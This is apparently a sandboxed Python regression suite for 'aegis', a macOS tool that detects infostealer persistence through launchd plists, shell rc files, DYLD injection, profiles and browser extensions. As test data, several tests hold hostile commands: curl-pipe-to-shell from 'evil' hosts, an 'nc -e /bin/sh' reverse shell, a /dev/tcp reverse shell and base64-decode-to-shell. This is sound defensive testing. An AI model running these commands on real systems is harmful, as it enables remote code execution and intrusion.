#!/usr/bin/env python3
"""Regression suite for aegis — one test per bug found in the battle-test pass.

Zero third-party deps (stdlib `unittest` only), matching the tool's own trust
model. Fully sandboxed: every ~/.aegis path, the persistence/hot dirs, and
`notify` are redirected into a per-test tmp dir, so this NEVER reads or writes
real state and NEVER fires a desktop notification. Each test is named for the
finding it pins and would FAIL against the pre-fix code.

Run:  python3 -m unittest discover -s tests        (from the repo root)
  or: python3 tests/test_regression.py
"""
import json
import os
import plistlib
import subprocess
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import aegis  # noqa: E402


class Sandbox(unittest.TestCase):
    """Base: redirect all aegis state/scan surfaces into a throwaway tmp dir."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="aegis_rt_")
        self.state = os.path.join(self.tmp, ".aegis")
        self.pers = os.path.join(self.tmp, "LaunchAgents")
        self.hot = os.path.join(self.tmp, "hot")
        for d in (self.state, self.pers, self.hot):
            os.makedirs(d)

        self._saved = {}
        overrides = {
            "STATE_DIR": self.state,
            "BASELINE": os.path.join(self.state, "baseline.json"),
            "FINDINGS_LOG": os.path.join(self.state, "findings.jsonl"),
            "LATEST_MD": os.path.join(self.state, "latest.md"),
            "LATEST_JSON": os.path.join(self.state, "latest.json"),
            "SEEN": os.path.join(self.state, "seen.json"),
            "SIGCACHE": os.path.join(self.state, "sigcache.json"),
            "ALLOWLIST": os.path.join(self.state, "allowlist.json"),
            "RUN_LOG": os.path.join(self.state, "run.log"),
            "SELFSTATE": os.path.join(self.state, "selfstate.json"),
            "SELF_PLIST": os.path.join(self.state, "com.charlie.aegis.plist"),
            "PERSISTENCE_DIRS": [self.pers],
            "HOT_DIRS": [self.hot],
            # New baseline-diffed surfaces read real machine state (shell rc,
            # profiles, browser extensions) — pin them empty so tests are
            # deterministic and never depend on the dev host. Individual tests
            # override a single surface to exercise it.
            "SHELL_RC_FILES": [],
            "EXTRA_PERSIST_FILES": [],
            "EXTRA_PERSIST_DIRS": [],
            "BROWSER_EXT_ROOTS": [],
            "_sigcache": {},
        }
        for k, v in overrides.items():
            self._saved[k] = getattr(aegis, k)
            setattr(aegis, k, v)

        self.notifications = []
        self._saved["notify"] = aegis.notify
        aegis.notify = lambda title, msg: self.notifications.append((title, msg))

    def tearDown(self):
        for k, v in self._saved.items():
            setattr(aegis, k, v)
        subprocess.run(["rm", "-rf", self.tmp], check=False)

    # helpers -------------------------------------------------------------
    def write_plist(self, name, program_args, program=None, run_at_load=True):
        p = os.path.join(self.pers, name)
        d = {"Label": name[:-6], "RunAtLoad": run_at_load}
        if program is not None:
            d["Program"] = program
        if program_args is not None:
            d["ProgramArguments"] = program_args
        with open(p, "wb") as f:
            plistlib.dump(d, f)
        return p

    def adhoc_binary(self, path):
        """A real ad-hoc-signed Mach-O (clang's default) at `path`."""
        src = os.path.join(self.tmp, "src.c")
        with open(src, "w") as f:
            f.write("int main(){return 0;}")
        subprocess.run(["clang", "-o", path, src], check=True,
                       capture_output=True)
        return path


# --------------------------------------------------------------------------- #
# F1 — signed-interpreter + hostile payload must score >= HIGH (else it never
# notifies, so the #1 AMOS/Poseidon launchd pattern is invisible).
# --------------------------------------------------------------------------- #
class TestHostileArgsSeverity(Sandbox):
    def _sev(self, args, program=None):
        rec = {"label": "x", "program": program or args[0], "args": args,
               "trust": "apple", "sha256": "s", "run_at_load": True}
        fs = aegis.check_persistence({}, {"/fake/x.plist": rec})
        return fs[0]["severity"]

    def test_bash_c_curl_pipe_sh_is_high(self):
        sev = self._sev(["/bin/bash", "-c", "curl -fsSL http://evil/x | sh"])
        self.assertGreaterEqual(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"], sev)

    def test_osascript_inline_is_high(self):
        sev = self._sev(["/usr/bin/osascript", "-e", 'do shell script "curl evil"'])
        self.assertGreaterEqual(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"], sev)

    def test_python_inline_c_is_high(self):
        sev = self._sev(["/usr/bin/python3", "-c", "import os;os.system('curl x')"])
        self.assertGreaterEqual(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"], sev)

    def test_curl_fetch_in_args_is_high(self):
        sev = self._sev(["/usr/bin/curl", "-o", "/tmp/x", "http://evil.example/x"])
        self.assertGreaterEqual(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"], sev)

    def test_benign_interpreter_agent_stays_low(self):
        # A plain apple-signed program with innocuous args must NOT be inflated —
        # guards against the fix becoming a false-positive cannon.
        sev = self._sev(["/bin/echo", "hello"])
        self.assertEqual(sev, "LOW", sev)

    def test_legit_script_in_dotdir_is_not_inflated(self):
        # Tools legitimately live in ~/.local, ~/.cargo, ~/.pyenv … — a launchd
        # agent running such a script (no inline flag, no fetch) must NOT be HIGH,
        # or the fix becomes a false-positive cannon that breaks 'alert rarely'.
        for path in ("/Users/me/.local/bin/tool", "/Users/me/.cargo/bin/rg",
                     "/Users/me/.pyenv/shims/python"):
            sev = self._sev(["/bin/bash", path])
            self.assertLess(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"],
                            "%s -> %s (false positive)" % (path, sev))

    def test_oracle_is_discriminating(self):
        # Mutation check: if _hostile_args is neutered, the HIGH assertion flips.
        saved = aegis._hostile_args
        aegis._hostile_args = lambda args: False
        try:
            sev = self._sev(["/bin/bash", "-c", "curl http://evil | sh"])
            self.assertEqual(sev, "LOW")  # proves the test depends on the mechanism
        finally:
            aegis._hostile_args = saved


# --------------------------------------------------------------------------- #
# F2 — a corrupt baseline must NOT silently re-baseline (erasing tamper evidence).
# --------------------------------------------------------------------------- #
class TestCorruptBaseline(Sandbox):
    def test_corrupt_baseline_alerts_and_does_not_retrust(self):
        aegis.cmd_scan(quiet=True)  # clean first-run baseline
        # attacker plants a new adhoc launch item AND corrupts the baseline
        self.write_plist("com.evil.plist", [self.adhoc_binary("/tmp/aegis_rt_pl")])
        with open(aegis.BASELINE, "w") as f:
            f.write("{ this is not valid json ")
        self.notifications.clear()
        aegis.cmd_scan(quiet=True)
        with open(aegis.LATEST_JSON) as fh:
            data = json.load(fh)
        fps = [x["fingerprint"] for x in data["findings"]]
        self.assertIn("integrity:baseline:corrupt", fps)
        # the planted malware is re-surfaced (not folded into known-good)…
        self.assertTrue(any(f["category"] == "persistence"
                            and "evil" in f["detail"].lower()
                            for f in data["findings"]))
        # …and something HIGH+ actually notified (not silent).
        self.assertTrue(self.notifications)
        subprocess.run(["rm", "-f", "/tmp/aegis_rt_pl"], check=False)


# --------------------------------------------------------------------------- #
# F3 — first-run silence is for PERSISTENCE only; a live hot-dir threat present
# at install must still alert (and keep being alertable, not swallowed by `seen`).
# --------------------------------------------------------------------------- #
class TestFirstRunScoping(Sandbox):
    def setUp(self):
        super().setUp()
        # Isolate the surface under test: stub the two checks that read real
        # machine state (hardening CLIs, running processes) so the result is
        # deterministic regardless of what this host happens to be running.
        self._saved_checks = (aegis.check_hardening, aegis.check_processes)
        aegis.check_hardening = lambda: []
        aegis.check_processes = lambda: []

    def tearDown(self):
        aegis.check_hardening, aegis.check_processes = self._saved_checks
        super().tearDown()

    def test_hotdir_threat_present_at_first_scan_notifies(self):
        self.adhoc_binary(os.path.join(self.hot, "payload"))
        aegis.cmd_scan(quiet=True)  # the VERY FIRST scan
        self.assertTrue(self.notifications,
                        "a hot-dir threat present before install must alert")

    def test_persistence_at_first_scan_stays_silent(self):
        self.write_plist("com.evil.plist", [self.adhoc_binary("/tmp/aegis_rt_p2")])
        aegis.cmd_scan(quiet=True)
        self.assertEqual(self.notifications, [],
                         "first-run persistence is baselined silently")
        subprocess.run(["rm", "-f", "/tmp/aegis_rt_p2"], check=False)


# --------------------------------------------------------------------------- #
# F4 — a different binary reusing an allowed path must NOT be silently covered.
# --------------------------------------------------------------------------- #
class TestFingerprintContentHash(Sandbox):
    def setUp(self):
        super().setUp()
        self._h = aegis.check_hardening
        aegis.check_hardening = lambda: []

    def tearDown(self):
        aegis.check_hardening = self._h
        super().tearDown()

    def test_hotdir_fingerprint_changes_when_content_changes(self):
        p = os.path.join(self.hot, "tool")
        self.adhoc_binary(p)
        f1 = aegis.check_hot_dirs()[0]["fingerprint"]
        # replace with different content at the SAME path
        with open(os.path.join(self.tmp, "s2.c"), "w") as f:
            f.write("int main(){return 42;}")
        subprocess.run(["clang", "-o", p, os.path.join(self.tmp, "s2.c")],
                       check=True, capture_output=True)
        aegis._sigcache = {}
        f2 = aegis.check_hot_dirs()[0]["fingerprint"]
        self.assertNotEqual(f1, f2, "different binary at reused path = new finding")


# --------------------------------------------------------------------------- #
# F5/F6 — location partitions: /usr/local and /private/var/folders are risky.
# --------------------------------------------------------------------------- #
class TestRiskyLocations(Sandbox):
    def test_usr_local_is_risky(self):
        self.assertTrue(aegis.is_risky_location("/usr/local/bin/evil"))

    def test_usr_bin_still_trusted(self):
        self.assertFalse(aegis.is_risky_location("/usr/bin/ls"))

    def test_private_var_folders_is_risky(self):
        self.assertTrue(
            aegis.is_risky_location("/private/var/folders/zz/abc/T/tool"))

    def test_var_folders_still_risky(self):
        self.assertTrue(aegis.is_risky_location("/var/folders/zz/abc/T/tool"))

    def test_usr_local_process_is_inspected(self):
        # canned `ps` + forced-adhoc classifier: a /usr/local process must be
        # flagged (pre-fix it was short-circuited as trusted and never checked).
        saved_run, saved_cls = aegis.run, aegis.classify_signature
        aegis.run = lambda cmd, timeout=15: (
            ("1234 /usr/local/bin/evil\n", "", 0)
            if cmd[:2] == ["ps", "-axo"] else ("", "", 0))
        aegis.classify_signature = lambda p: {"trust": "adhoc", "team": None,
                                              "authority": None}
        try:
            fs = aegis.check_processes()
            self.assertTrue(any(f["path"] == "/usr/local/bin/evil" for f in fs))
        finally:
            aegis.run, aegis.classify_signature = saved_run, saved_cls


# --------------------------------------------------------------------------- #
# F7 — sigcache must invalidate on content change and stay one-entry-per-path.
# --------------------------------------------------------------------------- #
class TestSigcacheKeying(Sandbox):
    def test_cache_invalidates_and_does_not_orphan(self):
        p = self.adhoc_binary("/tmp/aegis_rt_sc")
        try:
            aegis.classify_signature(p)
            stat1 = aegis._sigcache[p]["stat"]
            with open(os.path.join(self.tmp, "s3.c"), "w") as f:
                f.write("int main(){return 7;}")
            subprocess.run(["clang", "-o", p, os.path.join(self.tmp, "s3.c")],
                           check=True, capture_output=True)
            aegis.classify_signature(p)
            self.assertEqual(len(aegis._sigcache), 1,
                             "one entry per path — no orphaned stale key")
            self.assertNotEqual(aegis._sigcache[p]["stat"], stat1,
                                "stat-signature refreshed on content change")
        finally:
            subprocess.run(["rm", "-f", p], check=False)


# --------------------------------------------------------------------------- #
# F8 — seen.json is bounded (an hourly-forever tool can't grow it without limit).
# --------------------------------------------------------------------------- #
class TestSeenCap(Sandbox):
    def test_cap_seen_keeps_newest(self):
        n = aegis.SEEN_MAX + 250
        # exactly SEEN_MAX "new" (2026) entries + 250 "old" (2025) ones → the cap
        # must keep precisely the 2026 block and drop every 2025 entry.
        seen = {"fp%06d" % i: ("2026" if i < aegis.SEEN_MAX else "2025")
                + "-01-01T00:00:00+00:00" for i in range(n)}
        capped = aegis._cap_seen(seen)
        self.assertEqual(len(capped), aegis.SEEN_MAX)
        self.assertTrue(all(v.startswith("2026") for v in capped.values()),
                        "cap retains the newest entries by timestamp")

    def test_cap_seen_noop_under_limit(self):
        seen = {"a": "2026-01-01T00:00:00+00:00"}
        self.assertIs(aegis._cap_seen(seen), seen)


# --------------------------------------------------------------------------- #
# F-eff — the dead `launchctl print-disabled system` call is gone.
# --------------------------------------------------------------------------- #
class TestNoDeadLaunchctlCall(Sandbox):
    def test_print_disabled_not_invoked(self):
        calls = []
        saved = aegis.run

        def rec(cmd, timeout=15):
            calls.append(cmd)
            return ("", "", 0)

        aegis.run = rec
        try:
            aegis.check_hardening()
        finally:
            aegis.run = saved
        self.assertFalse(
            any(c[:2] == ["launchctl", "print-disabled"] for c in calls),
            "the unused launchctl print-disabled call must be removed")


# --------------------------------------------------------------------------- #
# Invariant — never-repeat: an unchanged world raises no second alert.
# --------------------------------------------------------------------------- #
class TestNeverRepeat(Sandbox):
    def setUp(self):
        super().setUp()
        self._saved_checks = (aegis.check_hardening, aegis.check_processes)
        aegis.check_hardening = lambda: []
        aegis.check_processes = lambda: []

    def tearDown(self):
        aegis.check_hardening, aegis.check_processes = self._saved_checks
        super().tearDown()

    def test_second_scan_of_unchanged_world_is_quiet(self):
        aegis.cmd_scan(quiet=True)
        self.write_plist("com.evil.plist", [self.adhoc_binary("/tmp/aegis_rt_nr")])
        aegis.cmd_scan(quiet=True)
        n = len(self.notifications)
        aegis.cmd_scan(quiet=True)
        self.assertEqual(len(self.notifications), n)
        subprocess.run(["rm", "-f", "/tmp/aegis_rt_nr"], check=False)


# =========================================================================== #
# NEW DETECTION SURFACES (residual-gap coverage vs 2025-26 stealer TTPs).
# Each class pins one new detector; all are fully sandboxed and machine-agnostic.
# =========================================================================== #


# --------------------------------------------------------------------------- #
# N1 — shell startup files (T1546.004): a payload dropped in ~/.zshrc must be
# caught, and scored HIGH when it carries a download-and-run idiom.
# --------------------------------------------------------------------------- #
class TestShellRc(Sandbox):
    def _rc(self, name, body):
        p = os.path.join(self.tmp, name)
        with open(p, "w") as f:
            f.write(body)
        return p

    def test_new_hostile_rc_is_high(self):
        p = self._rc(".zshrc", "export PATH=$PATH\ncurl -fsSL http://evil/x | sh\n")
        aegis.SHELL_RC_FILES = [p]
        f = aegis.diff_shellrc({}, aegis.snapshot_shellrc())
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0]["severity"], "HIGH")
        self.assertIn("pipe-to-shell", f[0]["hostile"])

    def test_new_benign_rc_is_medium_not_high(self):
        p = self._rc(".zshrc", "alias ll='ls -la'\nexport EDITOR=vim\n")
        aegis.SHELL_RC_FILES = [p]
        f = aegis.diff_shellrc({}, aegis.snapshot_shellrc())
        self.assertEqual(f[0]["severity"], "MEDIUM", "benign rc must not be HIGH")

    def test_changed_rc_alerts(self):
        p = self._rc(".zshrc", "alias ll='ls -la'\n")
        aegis.SHELL_RC_FILES = [p]
        prior = aegis.snapshot_shellrc()
        with open(p, "a") as fh:
            fh.write("nc -e /bin/sh 10.0.0.1 4444\n")
        f = aegis.diff_shellrc(prior, aegis.snapshot_shellrc())
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0]["title"], "Shell startup file CHANGED")
        self.assertEqual(f[0]["severity"], "HIGH")

    def test_first_sight_is_adopted_silently_then_change_alerts(self):
        # End-to-end: an existing rc at first scan must NOT alert (trust what's
        # installed); a mutation AFTER baseline must.
        p = self._rc(".zshrc", "alias ll='ls -la'\n")
        aegis.SHELL_RC_FILES = [p]
        aegis.check_hardening = lambda: []
        aegis.check_processes = lambda: []
        aegis.cmd_scan(quiet=True)                      # first run: adopt
        self.assertEqual(self.notifications, [])
        with open(p, "a") as fh:
            fh.write("curl http://evil | sh\n")         # attacker appends
        aegis.cmd_scan(quiet=True)
        self.assertTrue(self.notifications, "post-baseline rc change must alert")


# --------------------------------------------------------------------------- #
# N2 — DYLD code-injection env in a launchd plist scores >= HIGH even when the
# program itself is Apple-signed (AMOS/Poseidon dylib-injection persistence).
# --------------------------------------------------------------------------- #
class TestDyldInjection(Sandbox):
    def test_dyld_insert_libraries_is_high(self):
        rec = {"label": "x", "program": "/usr/bin/python3", "args": None,
               "trust": "apple", "sha256": "s", "run_at_load": True,
               "env": {"DYLD_INSERT_LIBRARIES": "/Users/me/.hidden/evil.dylib"}}
        fs = aegis.check_persistence({}, {"/fake/x.plist": rec})
        self.assertGreaterEqual(aegis.SEV_ORDER[fs[0]["severity"]],
                                aegis.SEV_ORDER["HIGH"])

    def test_snapshot_captures_only_injection_env(self):
        import plistlib as _p
        path = os.path.join(self.pers, "com.x.plist")
        with open(path, "wb") as f:
            _p.dump({"Label": "x", "Program": "/usr/bin/true",
                     "EnvironmentVariables": {"DYLD_INSERT_LIBRARIES": "/tmp/e.dylib",
                                              "LANG": "en_US.UTF-8"}}, f)
        snap = aegis.snapshot_persistence()
        env = snap[path]["env"]
        self.assertEqual(env, {"DYLD_INSERT_LIBRARIES": "/tmp/e.dylib"},
                         "only injection-relevant env kept (no PII/noise)")


# --------------------------------------------------------------------------- #
# N3 — expanded hostile-arg idioms in launchd persistence (base64|sh, /dev/tcp).
# --------------------------------------------------------------------------- #
class TestExpandedHostileArgs(Sandbox):
    def _sev(self, args):
        rec = {"label": "x", "program": args[0], "args": args, "trust": "apple",
               "sha256": "s", "run_at_load": True, "env": None}
        return aegis.check_persistence({}, {"/fake/x.plist": rec})[0]["severity"]

    def test_base64_decode_pipe_shell_is_high(self):
        sev = self._sev(["/bin/sh", "-lc", "echo aGkK | base64 -d | sh"])
        self.assertGreaterEqual(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"])

    def test_dev_tcp_reverse_shell_is_high(self):
        # No inline flag, no interpreter, no fetch keyword: caught purely by the
        # /dev/tcp reverse-shell idiom embedded in the arguments.
        sev = self._sev(["/opt/tool", "run", "exec 5<>/dev/tcp/10.0.0.1/4444"])
        self.assertGreaterEqual(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"])

    def test_benign_args_stay_low(self):
        self.assertEqual(self._sev(["/bin/echo", "hello world"]), "LOW")


# --------------------------------------------------------------------------- #
# N4 — quarantine provenance: a side-loaded (no-quarantine) hot-dir binary is
# annotated as Gatekeeper-bypassing; the download agent is parsed when present.
# --------------------------------------------------------------------------- #
class TestQuarantineProvenance(Sandbox):
    def test_origin_absent_and_present(self):
        p = os.path.join(self.tmp, "f")
        with open(p, "w") as f:
            f.write("x")
        self.assertEqual(aegis.quarantine_origin(p), (False, None))
        subprocess.run(["xattr", "-w", "com.apple.quarantine",
                        "0081;00000000;Safari;ABC", p], check=False)
        present, agent = aegis.quarantine_origin(p)
        self.assertTrue(present)
        self.assertEqual(agent, "Safari")

    def test_hotdir_side_loaded_note(self):
        payload = self.adhoc_binary(os.path.join(self.hot, "payload"))
        # clang output has no quarantine xattr → side-loaded
        f = [x for x in aegis.check_hot_dirs() if x["path"] == payload]
        self.assertTrue(f)
        self.assertFalse(f[0]["quarantined"])
        self.assertIn("side-loaded", f[0]["detail"])


# --------------------------------------------------------------------------- #
# N5 — self-protection: tamper on the monitor's own state is a HIGH signal, with
# no false positive on a machine that never installed the launchd agent.
# --------------------------------------------------------------------------- #
class TestSelfProtection(Sandbox):
    def test_log_truncation_detected(self):
        with open(aegis.FINDINGS_LOG, "w") as f:
            f.write("a" * 10)
        aegis.save_json(aegis.SELFSTATE, {"findings_size": 9999})
        fps = [x["fingerprint"] for x in aegis.check_self_protection()]
        self.assertTrue(any(fp.startswith("self:log:truncated") for fp in fps))

    def test_agent_removed_only_after_learned(self):
        # never installed → silent
        self.assertEqual(aegis.check_self_protection(), [])
        # learned installed, plist now gone → HIGH
        aegis.save_json(aegis.SELFSTATE, {"installed": True})
        fps = [x["fingerprint"] for x in aegis.check_self_protection()]
        self.assertIn("self:agent:removed", fps)

    def test_no_false_positive_on_growing_log(self):
        with open(aegis.FINDINGS_LOG, "w") as f:
            f.write("a" * 100)
        aegis.save_json(aegis.SELFSTATE, {"findings_size": 50})  # grew, fine
        fps = [x["fingerprint"] for x in aegis.check_self_protection()]
        self.assertFalse(any("truncated" in fp for fp in fps))


# --------------------------------------------------------------------------- #
# N6 — config profiles & login hooks: a newly-installed profile or hook alerts.
# --------------------------------------------------------------------------- #
class TestProfilesAndHooks(Sandbox):
    def test_new_profile_is_high(self):
        f = aegis.diff_profiles({}, {"com.evil.mdm": True})
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0]["severity"], "HIGH")
        self.assertEqual(f[0]["category"], "config-profile")

    def test_preexisting_profile_not_realerted(self):
        prior = {"com.corp.wifi": True}
        self.assertEqual(aegis.diff_profiles(prior, {"com.corp.wifi": True}), [])

    def test_new_loginhook_is_high(self):
        f = aegis.diff_loginhooks({}, {"LoginHook": "/tmp/evil.sh"})
        self.assertEqual(f[0]["severity"], "HIGH")
        self.assertEqual(f[0]["category"], "persistence")


# --------------------------------------------------------------------------- #
# N7 — browser extension inventory diff: a newly-appearing extension alerts.
# --------------------------------------------------------------------------- #
class TestBrowserExtensions(Sandbox):
    def _chromium(self, extid, name):
        root = os.path.join(self.tmp, "Chrome")
        vdir = os.path.join(root, "Default", "Extensions", extid, "1.0")
        os.makedirs(vdir)
        with open(os.path.join(vdir, "manifest.json"), "w") as f:
            json.dump({"name": name}, f)
        return root

    def test_new_extension_detected_with_name(self):
        root = self._chromium("abcdefghijklmnop", "Evil Wallet Drainer")
        aegis.BROWSER_EXT_ROOTS = [(root, "chromium")]
        snap = aegis.snapshot_browserext()
        self.assertTrue(any("abcdefghijklmnop" in k for k in snap))
        f = aegis.diff_browserext({}, snap)
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0]["severity"], "MEDIUM")
        self.assertIn("Evil Wallet Drainer", f[0]["detail"])


# --------------------------------------------------------------------------- #
# N8 — upgrade safety: an EXISTING install (baseline has only "persistence")
# gaining newly-watched surfaces must adopt them SILENTLY, not alert-storm.
# --------------------------------------------------------------------------- #
class TestSurfaceAdoptionOnUpgrade(Sandbox):
    def test_existing_install_adopts_new_surface_silently(self):
        rc = os.path.join(self.tmp, ".zshrc")
        with open(rc, "w") as f:
            f.write("curl http://evil | sh\n")   # even a hostile-looking rc…
        aegis.SHELL_RC_FILES = [rc]
        aegis.check_hardening = lambda: []
        aegis.check_processes = lambda: []
        # simulate a pre-upgrade baseline: persistence key only, no "shellrc".
        aegis.save_json(aegis.BASELINE,
                        {"created": "2026-01-01T00:00:00+00:00", "persistence": {}})
        aegis.cmd_scan(quiet=True)
        # …is adopted as known-good on first sight (no alert storm on upgrade)…
        self.assertEqual(self.notifications, [],
                         "first sighting of a surface is adopted silently")
        # …and the baseline now carries the surface for future diffing.
        with open(aegis.BASELINE) as fh:
            base = json.load(fh)
        self.assertIn("shellrc", base)


if __name__ == "__main__":
    unittest.main(verbosity=2)
